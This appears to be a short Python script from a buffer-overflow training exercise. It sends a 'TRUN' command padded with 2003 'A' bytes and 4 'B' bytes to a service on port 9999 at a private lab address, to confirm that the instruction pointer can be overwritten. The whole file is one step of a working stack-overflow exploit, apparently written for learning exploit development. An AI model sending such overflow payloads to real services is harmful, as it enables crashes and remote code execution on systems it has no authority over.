#!/usr/bin/python3

''' 
Carlos Enamorado
10/17/2023
EIP.py
Verify overwriting the EIP with 4 bytes of "B"
'''


import sys, socket
from time import sleep

shellcode = "A" * 2003 + "B" * 4

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.4.104',9999))

        payload = "TRUN /.:/" + shellcode

        s.send((payload.encode()))
        s.close()
except:
        print ("Error connecting to server")
        sys.exit()
